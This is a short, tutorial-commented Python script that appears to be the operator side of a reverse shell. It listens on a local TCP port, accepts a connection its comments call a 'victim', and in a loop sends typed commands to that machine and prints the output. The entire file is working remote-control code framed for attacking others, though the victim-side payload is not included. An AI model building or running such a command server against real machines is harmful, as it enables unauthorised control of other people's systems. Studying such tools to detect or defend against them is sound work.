# This module provides access to the BSD socket interface. (https://realpython.com/python-sockets/)
# Sockets and the socket API are used to send messages across a network. 
import socket

# Declaring the ip and port of the server.
host = '127.0.0.1'
port = 6669

# Initializing the server.
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Binding the server to the host...
server.bind((host, port))
print('[...] Server started')
print('[...] Listening for client connection')
# ...and listening for incoming connections.
server.listen(5)

# Accepting connections from clients/ victims.
client, client_addr = server.accept()
print(f'[!] Client: {client_addr} connected')

while True:

    # Waiting for commands/ inputs...
    print("Enter command...")
    command = input('> ')
    command = command.encode()

    # ...and sending the command to the client.
    client.send(command)

    # Receiving the output and...
    output = client.recv(1024)
    output = output.decode()

    # ...printing it to the screen.
    print(f'Output: {output}')